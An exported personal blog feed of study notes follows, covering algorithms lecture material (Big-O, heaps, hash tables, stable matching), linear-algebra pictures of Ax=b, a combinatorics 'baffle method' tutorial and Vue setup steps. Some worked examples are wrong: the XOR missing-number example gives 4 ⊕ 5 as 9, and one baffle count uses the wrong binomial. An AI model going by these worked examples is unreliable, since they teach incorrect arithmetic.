class="headerlink" title="Algorithm"></a>Algorithm</h3><p>Sort the geese in ascending order of height, using merge sort.</p><p>For each goose i, a matching goose must have height $H - h_i$. Since the heights are now nondecreasing, we can search for this required length using binary search, and answer yes if it is found.</p><p>Is this algorithm correct?</p><ul><li>Does it correctly answer all ‘yes’ instances?</li><li>Does it correctly answer all ‘no’ instances?</li></ul><p>What is the time complexity of this algorithm?</p><ul><li>How long does the sort take?</li><li>How many times is the binary search run?</li><li>How long does each binary search take?</li></ul><p>You will usually have to justify that your algorithm is correct and that it runs with in the specified time complexity.</p><hr><h1 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h1><p>Problem: Tom and his wife Mary went to a party where nine more couples were present.</p><p>Not everyone knew everyone else, so people who did not know each other introduced themselves and shook hands. People who knew each other from before did not shake hands.</p><p>Later that evening Tom got bored, so he walked around and asked all other guests (including his wife) how many hands they had shaken that evening, and got 19 different answers.</p><ol><li><p>How many hands did Mary shake?</p></li><li><p>How many hands did Tom shake?</p></li></ol><hr><h1 id="Lec2"><a href="#Lec2" class="headerlink" title="Lec2"></a>Lec2</h1><p><strong>Heap sort</strong> is faster than <strong>bubble sort</strong>.</p><p><strong>Linear search</strong> is slower than <strong>binary search</strong>.</p><p>The statements on the previous slide are most commonly made in comparing the <strong>worst case performance</strong> of these algorithms.</p><p>They are actually <strong>false</strong> <strong>in the best case</strong>!</p><p>In most problems in this course, we are concerned with <strong>worst case performance</strong>, so as <strong>to be robust to maliciously created (or simply unlucky) instance</strong></p><p>We will <strong>hardly</strong> ever <strong>discuss the best case</strong>.</p><h3 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h3><p>If $f(100) &gt; g(100)$, then does f represent a greater running time, i.e. as lower algorithm?</p><h3 id="Answer"><a href="#Answer" class="headerlink" title="Answer"></a>Answer</h3><p>Not necessarily! $n=100$ might be an outlier, or too small to appreciate the efficiencies of algorithm $f$. We care more about which algorithm <strong>scales better</strong>.</p><h3 id="Big-Ohnotation-Examples"><a href="#Big-Ohnotation-Examples" class="headerlink" title="Big-Ohnotation: Examples"></a>Big-Ohnotation: Examples</h3><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h4><p>Let $f(n)=100n$. Then $f(n)=O(n)$, because $f(n)$ is at most 100 times $n$ for largen.</p><h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h4><p>Let $f(n)=2n+7$. Then $f(n)=O(n^2)$, because $f(n)$ is at most 1 times $n^2$ for large $n$. Note that $f(n)=O(n)$ is <strong>also true</strong> in this case.</p><p>这里注意啊，区别下<em>COMP9101</em>和<em>COMP9020</em>的区别，不太一样，算法没数学那么严谨看来。 $f(n)=2n+7$. Then $f(n)=O(n^2)$ $f(n)=O(n)$ is <strong>also true</strong>， 只要是上界函数，甭管n还是n方还是n立方，只要渐近增长大就是<strong>上界</strong>。</p><h4 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h4><p>Let $f(n)=0.001n^3$. Then $f(n) \neq O(n^2)$, because for any constant multiple of $n^2$, $f(n)$ will eventually exceed it.</p><hr><p><strong>inserting</strong> into <strong>a binary search tree</strong> takes $O(h)$ time in the worst case, where <strong>h is the height of the tree</strong>, and </p><p><strong>insertion sort</strong> runs in $O(n^2)$ time in the <strong>worst case</strong>, but $O(n)$ in the <strong>best case</strong>.</p><h3 id="Question-1"><a href="#Question-1" class="headerlink" title="Question"></a>Question</h3><p>The definition states that we only care about the function values for “large enough” n. How large is “large enough”? Put differently, how small is “small enough” that it can be safely ignored in assessing whether the definition is satisfied?</p><h3 id="Answer-1"><a href="#Answer-1" class="headerlink" title="Answer"></a>Answer</h3><p>Everything is small compared to the <strong>infinity</strong> of <em>n-values</em> beyond itself.</p><p>It doesn’t matter how $f(1)$ compares to $g(1)$, or even how $f(1,000,000)$ compares to $g(1,000,000)$. We only care that $f(n)$ is bounded above by a multiple of $g(n)$ eventually.</p><h3 id="Big-Omega-notation"><a href="#Big-Omega-notation" class="headerlink" title="Big-Omega notation"></a>Big-Omega notation</h3><h4 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h4><p>We say $f(n)=Ω(g(n))$ if for large enoughn, $f(n)$ is at least a constant multiple of $g(n)$.</p><h3 id="Big-Theta-notation"><a href="#Big-Theta-notation" class="headerlink" title="Big-Theta notation"></a>Big-Theta notation</h3><h4 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h4><p>We say $f(n)=Θ(g(n))$ if</p><script type="math/tex; mode=display">f(n)=O(g(n)) \quad and \quad f(n)=Ω(g(n))</script><p>$f(n)$ and $g(n)$ are said to have the same asymptotic growth rate.</p><ol><li><p>$f(n)$ and $g(n)$ are said to have the same asymptotic growth rate.</p></li><li><p>Analgorithm whose running time is $f(n)$ scales as well as one whose running time is $g(n)$.</p></li><li><p>It’s true-ish to say that the former algorithm is ‘as fast as’ the latter.</p></li></ol><h3 id="Question-2"><a href="#Question-2" class="headerlink" title="Question"></a>Question</h3><p>You’ve previously seen statements such as</p><hr><p>bubble sort runs in $O(n^2)$ time in the worst case.</p><hr><p>Should these statements be written using $Θ(·)$ instead of $O(·)$?</p><h3 id="Answer-2"><a href="#Answer-2" class="headerlink" title="Answer"></a>Answer</h3><p>They can, but they don’t have to be. The statements </p><hr><p>bubble sort runs in $O(n^2)$ time in the worst case</p><hr><p>and</p><hr><p>bubble sort runs in $Θ(n^2)$ time in the worst case</p><hr><p>are both true: they claim that the worst case running time is <strong>at most</strong> quadratic and <strong>exactly</strong> quadratic respectively.</p><p>The $Θ(·)$ statement conveys more information than the $O(·)$ statement. However <strong>in most situations we just want to be sure that the running time hasn’t been underestimated</strong>, so <strong>$O(·)$ is the important part</strong>.</p><p>Note that sometimes confusions arise because people write the more commonly used $O(·)$ as a shorthand for the less commonly used $Θ(·)$! Please be aware of the difference.</p><h3 id="Sum-property"><a href="#Sum-property" class="headerlink" title="Sum property"></a>Sum property</h3><h4 id="Fact-of-sum"><a href="#Fact-of-sum" class="headerlink" title="Fact of sum"></a>Fact of sum</h4><p>If $f_1 = O(g_1)$ and $f_2 = O(g_2)$, then $f_1 +f_2 = O(g_1 +g_2)$.</p><p><strong>The last term $O(g_1 +g_2)$ is often rewritten as $O(max(g_1,g_2))$, since $g_1 + g_2 ≤ 2 max(g_1,g_2)$</strong>.</p><p>The same property applies if $O$ is replaced by $Ω$ or $Θ$.</p><h4 id="Fact-of-Product"><a href="#Fact-of-Product" class="headerlink" title="Fact of Product"></a>Fact of Product</h4><p>If $f_1 = O(g_1)$ and $f_2 = O(g_2)$, then $f_1 ·f_2 = O(g_1 ·g_2)$.</p><h3 id="Binary-Heaps"><a href="#Binary-Heaps" class="headerlink" title="(Binary)Heaps"></a>(Binary)Heaps</h3><p>Store items in a complete binary tree, with every parent comparing $≥$ all its children.</p><p>This is a max heap; replace $≥$ with $≤$ for min heap.</p><p>Used to implement priority queue.</p><h4 id="Operations"><a href="#Operations" class="headerlink" title="Operations"></a>Operations</h4><p>Build heap: $O(n)$</p><p>Find maximum: $O(1)$</p><p>Delete maximum: $O(log n)$</p><p>Insert: $O(log n)$</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-23-22-34-21.png" alt></p><h3 id="Binary-search-trees"><a href="#Binary-search-trees" class="headerlink" title="Binary search trees"></a>Binary search trees</h3><p>Store (comparable) keys or key-value pairs in a binary tree, where each node has at most two children, designated as <strong>left</strong> and <strong>right</strong></p><p>Each node’s key compares greater than all keys in its left subtree, and less than all keys in its right subtree.</p><h4 id="Operations-1"><a href="#Operations-1" class="headerlink" title="Operations"></a>Operations</h4><p>Let h be the height of the tree, that is, the length of the longest path from the root to the leaf.</p><p>Search: $O(h)$</p><p>Insert/delete: $O(h)$</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-23-22-43-45.png" alt></p><h3 id="Self-balancing-binary-search-trees"><a href="#Self-balancing-binary-search-trees" class="headerlink" title="Self-balancing binary search trees"></a>Self-balancing binary search trees</h3><p>In the best case, $h ≈ log_2 n$. Such trees are said to be <strong>balanced</strong>.</p><p>In the worst case, $h ≈ n$, e.g. if keys were inserted in increasing order.</p><p>Fortunately, there are several ways to make a <strong>self-balancing</strong> binary search tree (e.g. <strong>B-tree</strong>, <strong>AVL tree</strong>, <strong>red-black tree</strong>).</p><p>Each of these performs rotations to maintain certain invariants, in order to guarantee that $h = O(log n)$ and therefore all tree operations run in $O(log n)$ time.</p><p>Red-black trees are detailed in <strong>CLRS</strong>, but in this course it is sufficient to write “self-balancing binary search tree” without specifying any particular scheme.</p><h3 id="Frequency-tables"><a href="#Frequency-tables" class="headerlink" title="Frequency tables"></a>Frequency tables</h3><p>名字其实就是“频率统计”的意思，像是字典。</p><h4 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h4><p>You are given an array A of $n-1$ elements. Each number from 1 to n appears exactly once, except for one number which is missing.</p><p>Find the missing number.</p><h4 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h4><p>Record whether you’ve seen each possible value.</p><p>This leads to a <strong>linear time</strong>, <strong>linear space</strong> algorithm.</p><p>这个Idea是频率统计的方法步骤，但是空间复杂度比较高 $O(n)$，以下是控制空间复杂度为 $O(1)$ 的方法</p><h4 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h4><p>How could you solve the problem in linear time and <strong>constant</strong> space?</p><h4 id="steps"><a href="#steps" class="headerlink" title="steps"></a>steps</h4><p>To count the occurrences of integers from 1 to m, simply make a zero-initialised array of frequencies and increment every time the value is encountered.</p><p>The real question is how to count the occurences of other kinds of items, such as large integers, strings, and so on.</p><p>Try to do the same thing: map these items to integers from 1 to m, and count the occurences of the mapped values.</p><h4 id="方法1：求和"><a href="#方法1：求和" class="headerlink" title="方法1：求和"></a>方法1：求和</h4><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-23-22-57-59.png" alt></p><h4 id="方法2：XOR"><a href="#方法2：XOR" class="headerlink" title="方法2：XOR"></a>方法2：XOR</h4><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-23-22-58-34.png" alt></p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-23-22-59-25.png" alt></p><p>假设 A = [1, 2, 4, 5]，我们要找缺失的数 3，n = 5。</p><pre><code>1 ⊕ 2 ⊕ 3 ⊕ 4 ⊕ 5= (1 ⊕ 2) ⊕ 3 ⊕ (4 ⊕ 5)= 3 ⊕ 3 ⊕ 9= 0 ⊕ 9= 9</code></pre><p>Then</p><pre><code>1 ⊕ 2 ⊕ 4 ⊕ 5= (1 ⊕ 2) ⊕ (4 ⊕ 5)= 3 ⊕ 9= 10</code></pre><p>完整的 XOR ⊕ A 里的 XOR = 9 ⊕ 10 = 3</p><h3 id="Hash-tables"><a href="#Hash-tables" class="headerlink" title="Hash tables"></a>Hash tables</h3><p>Store <strong>values</strong> indexed by <strong>keys</strong>.</p><p>Hash function maps keys to indices in a fixed size table.</p><p>Ideall no two keys map to the same index.</p><h4 id="Operations-expected"><a href="#Operations-expected" class="headerlink" title="Operations(expected)"></a>Operations(expected)</h4><p>Search for the value associated to a given key: $O(1)$</p><p>Update the value associated to a given key: $O(1)$</p><p>Insert/delete: $O(1)$</p><hr><p>A situation where two (or more) keys have the same hash value is called a <strong>collision</strong>.</p><p>When mapping from a large key space to a small table, it’s <strong>impossible</strong> to completely avoid collisions.</p><p>There are several ways to manage collisions - for example, separate chaining stores a linked list of all colliding key-value pairs at each index of the hash table.</p><h4 id="Operations-worst-case"><a href="#Operations-worst-case" class="headerlink" title="Operations (worst case)"></a>Operations (worst case)</h4><p>Search for the value associated to a given key: $O(n)$</p><p>Update the value associated to a given key: $O(n)$</p><p>Insert/delete: $O(n)$</p><h1 id="proof"><a href="#proof" class="headerlink" title="proof"></a>proof</h1><h2 id="Propositional-logic"><a href="#Propositional-logic" class="headerlink" title="Propositional logic"></a>Propositional logic</h2><p>Propositions are true/false statements. Some examples:</p><ul><li><p>The sky is orange.</p></li><li><p>Basser Steps consists of more than 100 stairs.</p></li><li><p>Everyone in this room is awake.</p></li></ul><p>The goal of an argument is usually to establish a relationship between propositions, often also using the following operations.</p><div class="table-container"><table><thead><tr><th>Notation</th><th>Meaning</th><th>Formal term</th></tr></thead><tbody><tr><td>¬P</td><td>not P</td><td>negation</td></tr><tr><td>P∧Q</td><td>P and Q</td><td>conjunction</td></tr><tr><td>P∨Q</td><td>P(inclusive-) or Q</td><td>disjunction</td></tr><tr><td>P→Q</td><td>if P then Q</td><td>implication</td></tr></tbody></table></div><p>The quantifiers “for all” ($∀$) and “for some” ($∃$) are also very common.</p><h1 id="mergesort"><a href="#mergesort" class="headerlink" title="mergesort"></a>mergesort</h1><p>The depth of recursion in mergesort is $log_2 n$</p><p>On each level of recursion, merging all the intermediate arrays takes $O(n)$ steps in total.</p><p>Thus, mergesort always terminates, and in fact it terminates in $O(n log_2 n)$ steps.</p><h1 id="Stable-Matching-Problem"><a href="#Stable-Matching-Problem" class="headerlink" title="Stable Matching Problem"></a>Stable Matching Problem</h1><p>Suppose you have hired n frontend engineers and n backend engineers to build n apps in pairs.</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-26-13-44-21.png" alt></p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-26-13-44-28.png" alt></p><p>Question</p><p>Give n frontend and n backend engineers, how many ways are there to match them, without regard for preferences?</p><p>Answer</p><p>$n!≈(n/e)^n$ - more than exponentially many in $n$ ($e≈2.718$).</p><p>这个为啥不是 n 乘 n， 和之前数学学统计概率那儿不一样。因为数学里我遇到的问题是，第一个篮子5苹果，第二个篮子3苹果，几种选择方法？是$5 \times 3 = 15$种挑法。这里说的是匹配问题，人人都要匹配，因此是$n! = n \times (n-1) \times (n-2) \dots \times 1$.</p><p>$n!≈(\frac{n}{e})^n$ 是 <strong>斯特林近似</strong> (<strong>Stirling’s approximation</strong>) 的一种简化形式，它用于近似计算 阶乘 $𝑛!$ 的增长速度。</p><p><strong>阶乘</strong>的<strong>增长速度</strong>比<strong>指数</strong>增长<strong>更快</strong>，但比超指数增长（如 $n^n$ ）慢。</p><p><strong>Question</strong></p><p>Is it true that for every possible collection of n lists of preferences provided by all frontend engineers, and n lists of preferences provided by all backend engineers, a stable matching always exists?</p><p><strong>Answer</strong></p><p>Perhaps surprisingly, yes!</p><hr><h2 id="Gale-Shapley-algorithm"><a href="#Gale-Shapley-algorithm" class="headerlink" title="Gale-Shapley algorithm"></a>Gale-Shapley algorithm</h2><p><strong>Question</strong></p><p>Can we find a stable matching in a reasonable amount of time?</p><p><strong>Answer</strong></p><p>Yes, using the <strong>Gale-Shapley algorithm</strong>.</p><p>Produces pairs in stages, with possible revisions.</p><p>Frontend engineers will be pitching to backend engineers (arbitrarily chosen). Backend engineers will decide to accept a pitch or not.</p><p>A frontend engineer who is not currently in a pair will be<br>called solo.</p><p>Start with all frontend engineers solo.</p><h2 id="Outline-of-algorithm"><a href="#Outline-of-algorithm" class="headerlink" title="Outline of algorithm"></a>Outline of algorithm</h2><p>While there is a solo frontend engineer who has not pitched to all backend engineers, pick any such solo frontend engineer, say <strong>Femi</strong>.</p><p><strong>Femi</strong> pitches to the highest ranking backend engineer <strong>Brad</strong> on his list, ignoring any who he has pitched to before.</p><ul><li><p>If Brad is not yet paired, he accepts Femi’s pitch (at least tentatively).</p></li><li><p>Otherwise, if Brad is already paired with someone else, say Frida </p></li><li><ul><li>if Brad prefers Femi to Frida, he turns down Frida and makes a new pair with Femi (making Frida now solo) 50</li></ul></li><li><ul><li>otherwise, Brad will turn down Femi and stay with Frida.</li></ul></li></ul><p><strong>Question</strong>. Does the algorithm work? And is it efficient?</p><p>To answer this, we will prove the following 3 claims:</p><p><strong>Claim1</strong></p><p>The algorithm terminates after $≤ n^2$ rounds.</p><p><strong>Claim2</strong></p><p>The algorithm produces a <strong>perfect matching</strong>, i.e.when the algorithm terminates, the $2n$ engineers form $n$ separate pairs.</p><p><strong>Claim3</strong></p><p>The matching produced by the algorithm is <strong>stable</strong>.</p><p><a href="https://www.youtube.com/watch?v=0m_YW1zVs-Q">youtube</a></p><p>注意，把上文的前端后端组我称呼为A, B 组，其实也对应视频里的MALES和FEMALES两个组。</p><p>A组是从偏好的高到低选，B组是从偏好的低到高选。</p><p>A组优先选人，一轮选完（不求全部配对），因为有可能后者被前者抢了第一偏好，因此在第二轮、第三轮等再匹配。</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-26-14-38-58.png" alt></p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-26-14-40-07.png" alt></p><h2 id="关于此算法更有利于追求方，被追求方少利"><a href="#关于此算法更有利于追求方，被追求方少利" class="headerlink" title="关于此算法更有利于追求方，被追求方少利"></a>关于此算法更有利于追求方，被追求方少利</h2><p>That’s right, the algorithm is always unfair for one party because it is not symmetric. It is designed to give the “proposing party” the best possible stable match, and the “accepting party” potentially a worse, but still stable match. </p><p>But the goal of the algorithm is to generate a stable match, and that’s what it does.</p><p>In fact, one can prove that the Gale-Shapley algorithm is optimal for the party proposing and pessimal (i.e. least favourable) for the party rejecting. This is actually a key fact about the algorithm that allows us to find when there is a unique stable matching!</p><p>They mean that a backend engineer will only switch their pairing if they are presented with a frontend engineer that they prefer more. The sequence of frontend engineers that a particular backend engineer is pair is non-decreasing in preference over time and will eventually become constant.</p><p>Say a backend engineer is first offered with their 6th preference, then they accept by default. If we then offer the following front engineers with numbers representing preferences: (10, 4, 7, 6, 5, 11, 2, 3), then their accepted engineer sequence would be (6, 6, 4, 4, 4, 4,4, 2, 2). This is non decreasing in preference.</p><h1 id="puzzle-1"><a href="#puzzle-1" class="headerlink" title="puzzle"></a>puzzle</h1><p>On a circular highway there are n petrol stations, unevenly spaced, each containing a different quantity of petrol. It is known that the total amount of petrol from all stations is exactly enough to go around the highway once.</p><p>You want to start at a petrol station, take all its fuel, and drive clockwise around the highway once. Each time you reach a petrol station, you will take all its fuel too.1 The only problem is the possibility that you might run out of fuel before reaching the next petrol station!</p><p>Prove that there is always at least one starting petrol station to make it around the highway.</p>]]></content>
      
      
      <categories>
          
          <category> COMP9101 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LA1-Geometry</title>
      <link href="/2025/01/05/Math/LA1-Geometry/"/>
      <url>/2025/01/05/Math/LA1-Geometry/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#how-to-use-matrices-to-the-simultaneous-equations">how to use matrices to the simultaneous equations</a></li><li><a href="#endbmatrix">\end{bmatrix}</a></li><li><a href="#endbmatrix-1">\end{bmatrix}</a><ul><li><a href="#row-picture">Row Picture</a></li><li><a href="#column-picture">Column Picture</a></li></ul></li><li><a href="#how-about-three-elements">how about three elements</a></li><li><a href="#a">A</a></li><li><a href="#b">b</a><ul><li><a href="#row-picture-1">Row Picture</a></li><li><a href="#column-picture-1">Column picture</a></li></ul></li><li><a href="#question-about-the-existence-of-every-b">question about the existence of every b</a></li></ul><h1 id="how-to-use-matrices-to-the-simultaneous-equations"><a href="#how-to-use-matrices-to-the-simultaneous-equations" class="headerlink" title="how to use matrices to the simultaneous equations"></a>how to use matrices to the simultaneous equations</h1><script type="math/tex; mode=display">\begin{cases}2x - y &= 0, \\-x + 2y &= 3.\end{cases}</script><p>What is the coefficient matrix?</p><script type="math/tex; mode=display">A \cdot B =\begin{bmatrix}a_{11} & a_{12} \\a_{21} & a_{22}\end{bmatrix}\cdot\begin{bmatrix}b_{11} & b_{12} \\b_{21} & b_{22}\end{bmatrix}=\begin{bmatrix}a_{11}b_{11} + a_{12}b_{21} & a_{11}b_{12} + a_{12}b_{22} \\a_{21}b_{11} + a_{22}b_{21} & a_{21}b_{12} + a_{22}b_{22}\end{bmatrix}</script><p>Hence </p><script type="math/tex; mode=display">\begin{bmatrix}2 & -1 \\-1 & 2\end{bmatrix}\cdot\begin{bmatrix}x \\y\end{bmatrix}=\begin{bmatrix}0 \\3\end{bmatrix}</script><p>It’s called </p><script type="math/tex; mode=display">Ax=b</script><h2 id="Row-Picture"><a href="#Row-Picture" class="headerlink" title="Row Picture"></a>Row Picture</h2><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-08-47-48.png" alt></p><h2 id="Column-Picture"><a href="#Column-Picture" class="headerlink" title="Column Picture"></a>Column Picture</h2><script type="math/tex; mode=display">x\cdot\begin{bmatrix}2 \\-1\end{bmatrix}+y\cdot\begin{bmatrix}-1 \\2\end{bmatrix}=\begin{bmatrix}0 \\3\end{bmatrix}</script><p>This is the linear combination of columns.</p><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-08-52-30.png" alt></p><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-08-55-46.png" alt></p><h1 id="how-about-three-elements"><a href="#how-about-three-elements" class="headerlink" title="how about three elements"></a>how about three elements</h1><p>Just simply combine the x and y, we would gain $x=1 \quad and \quad y=2$.</p><script type="math/tex; mode=display">\begin{cases}2x - y &= 0, \\-x + 2y - z &= -1 \\-3y + 4z &= 4\end{cases}</script><script type="math/tex; mode=display">A=\begin{bmatrix}2 & -1 & 0\\-1 & 2 & -1\\0 & -3 & 4\end{bmatrix}</script><script type="math/tex; mode=display">b=\begin{bmatrix}0\\-1\\4\end{bmatrix}</script><p>Hence</p><script type="math/tex; mode=display">\begin{bmatrix}2 & -1 & 0\\-1 & 2 & -1\\0 & -3 & 4\end{bmatrix}\cdot\begin{bmatrix}x\\y\\z\end{bmatrix}=\begin{bmatrix}0\\-1\\4\end{bmatrix}</script><h2 id="Row-Picture-1"><a href="#Row-Picture-1" class="headerlink" title="Row Picture"></a>Row Picture</h2><p>seperately let two of the elements be equal to zero, then get the third element’s coordinate.</p><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-09-05-20.png" alt></p><h2 id="Column-picture"><a href="#Column-picture" class="headerlink" title="Column picture"></a>Column picture</h2><script type="math/tex; mode=display">x\cdot\begin{bmatrix}2 \\-1 \\0\end{bmatrix}+y\cdot\begin{bmatrix}-1 \\2 \\-3\end{bmatrix}+z\cdot\begin{bmatrix}0 \\-1 \\4\end{bmatrix}=\begin{bmatrix}0 \\-1 \\4\end{bmatrix}</script><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-09-18-40.png" alt></p><p>These equations ask us to combine the three vectors in the coordinate. Eventually we got <code>x=0 y=0 z=1</code></p><h1 id="question-about-the-existence-of-every-b"><a href="#question-about-the-existence-of-every-b" class="headerlink" title="question about the existence of every b"></a>question about the existence of every b</h1><p>Can I solve Ax=b for every b?</p><p>Do the linear combs of the columns fill 3-D space?</p><p>For the matrix, the answer is YES. But if these b forming in the same plane, you will get the same plain as the result.</p><p><img src="/2025/01/05/Math/LA1-Geometry/2025-01-05-09-32-42.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LinearAlgebra</title>
      <link href="/2025/01/05/Math/LinearAlgebra/"/>
      <url>/2025/01/05/Math/LinearAlgebra/</url>
      
        <content type="html"><![CDATA[<p>Good noon, everybody!</p><p>Because recently I am on my summer vacation for whole three months, while Chrismas and New Year (I guess you may know my hemisphere).</p><p>The first one month was so boring, I just traveled every corner in my city. For better meaning of the left time of vacation, I decided to learn Linear Algebra in MIT platform. In the meanwhile, I selected all AI-related curriculums of all the three terms in 2025. I just want to figure out all the problem and details of AI.</p><p>This is the website owned by MIT, link: <a href="https://web.mit.edu/18.06/www/">MASSACHUSETTS INSTITUTE OF TECHNOLOGY</a>, lecturer is <code>Gilbert Strang</code>. Relevent exam and notes is on <a href="https://github.com/mitmath/1806">github</a>.</p><p>Just clone the repository, and start a local jupternotebook server, and there are a lot of code here to run the computation of matrix.</p><p>I suggest me to learn something about numpy and metaploit.</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Baffle_Method</title>
      <link href="/2024/12/11/Math/Baffle-Method/"/>
      <url>/2024/12/11/Math/Baffle-Method/</url>
      
        <content type="html"><![CDATA[<p>Refer to <a href="https://senranja.github.io/2024/11/18/Math/Combinatorics/">Combinatorics</a> and <a href="https://senranja.github.io/2024/11/18/Math/Probability/">Probability</a>, Baffle_Method occured in <strong>Tutorial 8</strong>.</p><h1 id="Combinations-and-Permutations"><a href="#Combinations-and-Permutations" class="headerlink" title="Combinations and Permutations"></a>Combinations and Permutations</h1><script type="math/tex; mode=display">(n)_r = \frac{n!}{(n-r)!}</script><p>and </p><script type="math/tex; mode=display">\binom{n}{r} = \frac{n!}{(n-r)!r!}</script><p>The number of ways to select k items from a set of n items:</p><div class="table-container"><table><thead><tr><th>With Replacement</th><th>Order Matters</th><th>Formula</th></tr></thead><tbody><tr><td>Yes</td><td>Yes</td><td>$n^k$</td></tr><tr><td>No</td><td>Yes</td><td>$(n)_k$</td></tr><tr><td>No</td><td>No</td><td>$\binom{n}{k}$</td></tr><tr><td>Yes</td><td>No</td><td>$\binom{n+k-1}{k}$</td></tr></tbody></table></div><h1 id="Question"><a href="#Question" class="headerlink" title="Question"></a><strong>Question</strong></h1><p>a. How many ways can 20 identical balloons and 32 distinct lollipops be distributed among 4 children? </p><p>b. What if each child gets at least 1 ball and exactly 8 lollipops?</p><h1 id="Answer"><a href="#Answer" class="headerlink" title="Answer"></a><strong>Answer</strong></h1><p><code>identical</code> means totally the same, so that we don’t distinguish any of them.</p><p>In this question, we focus on Baffle Method, so we focus only on the identical 20 balloons.</p><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a><strong>Analysis</strong></h1><h2 id="a"><a href="#a" class="headerlink" title="a"></a>a</h2><p>a. 20 identical balloons would be distributed to 4 children. May someone gain 0 or 20 balloons.</p><p>The question is a category question. It’s not a permutation or comborics problem. We need to divide the 20 balloons into 4 categories, with order of the item numbers.</p><p>For example, list a small number:</p><p><strong>Four</strong> identical balloons, distribute them to <strong>3 different children</strong>.</p><p>There are some solutions:</p><pre><code>0 0 40 4 04 0 01 0 31 2 1...</code></pre><p>Obviously it’s a category problem. We need to divide rather not a pure permutate or combination.</p><p>Imagine the baffles and four balloons.</p><p><img src="/2024/12/11/Math/Baffle-Method/2024-12-11-08-26-22.png" alt></p><p>Four different children, means three baffles. We regard the baffles as the balloons. So there are six positions, and there should be two baffles in them.</p><p>Then we talk about the baffles’s combinations so that we could know how many conditions that the baffles could divide the balloons.</p><p>$\binom{4+3-1}{2} = \binom{6}{2}$</p><p>Yes! We have solved four balloons!</p><p>Then we look back to the 20 balloons:</p><p>$\binom{20+4-1}{3} = \binom{23}{3}$</p><p>Imagine there are totally 23 positions, and we choose 3 positions as baffles in them.</p><h2 id="b"><a href="#b" class="headerlink" title="b"></a>b</h2><p>b. What if each child gets at least 1 ball and exactly 8 lollipops?</p><p>We think of the three different children and four balloons firstly.</p><p>We found we can only confine the baffle positions into the intervals of the four balloons, so that every child could gain at least one balloon.</p><p><img src="/2024/12/11/Math/Baffle-Method/2024-12-11-08-39-15.png" alt></p><p>Hence $\binom{4-1}{3} = \binom{3}{3}$</p><p>The same to the b question, we gain $\binom{20-1}{3} = \binom{19}{3}$.</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vue</title>
      <link href="/2024/12/11/GUI/vue/"/>
      <url>/2024/12/11/GUI/vue/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#simply-use-vue-to-build-front-end">Simply use VUE to build front-end</a></li><li><a href="#download-the-lastest-nodejs">download the lastest node.js</a></li><li><a href="#create-vue-framework">create vue framework</a></li><li><a href="#add-element-plus">add Element-Plus</a></li></ul><h1 id="Simply-use-VUE-to-build-front-end"><a href="#Simply-use-VUE-to-build-front-end" class="headerlink" title="Simply use VUE to build front-end"></a>Simply use VUE to build front-end</h1><p>Althought I wrote a complete front-end project of an exam system, but I forget most knowledge about VUE because I don’t use it very often after I arrived in Sydney. Yesterday a friend asked me to make a simple website, I just thought maybe I can simply record some steps to build the application.</p><h1 id="download-the-lastest-node-js"><a href="#download-the-lastest-node-js" class="headerlink" title="download the lastest node.js"></a>download the lastest node.js</h1><p>I work on windows, and I download the pre-built binaries from the hyperlink here: <a href="https://nodejs.org/en/download/prebuilt-binaries">npm prebuilt-binaries</a></p><p>Download and unzip it, then I gained binaries. Just add the path into the host’s environment, then check <code>npm -v</code> and <code>node -v</code>.</p><p>If you want to upgrade npm and node, just uninstall npm at the control panel of the windows. Then download the lastest binaries from the nodejs’ offcial website. Nodejs contains both npm and node.</p><h1 id="create-vue-framework"><a href="#create-vue-framework" class="headerlink" title="create vue framework"></a>create vue framework</h1><p>please refer to <code>https://cn.vitejs.dev/guide/</code> for more details, which is VUE’s offcial website.</p><p>Use the command below to create vue.</p><pre><code>npm create vite@latest my-vue-app -- --template vue</code></pre><p><img src="/2024/12/11/GUI/vue/2024-12-11-07-57-28.png" alt></p><h1 id="add-Element-Plus"><a href="#add-Element-Plus" class="headerlink" title="add Element-Plus"></a>add Element-Plus</h1><p>refer to official website: <code>https://element-plus.org/zh-CN/</code>.</p><pre><code>npm install element-plus --save</code></pre><p>Then revise the original <strong>main.js</strong>, so that ensure you can use ES directly and correctly.</p><p>main.js</p><pre><code class="lang-js">import &#123; createApp &#125; from &#39;vue&#39;import ElementPlus from &#39;element-plus&#39;;import &#39;element-plus/dist/index.css&#39;; // 确保引入 Element Plus 的样式import App from &#39;./App.vue&#39;const app = createApp(App); // 创建应用实例app.use(ElementPlus); // 使用 Element Plus 插件app.mount(&#39;#app&#39;); // 挂载应用到 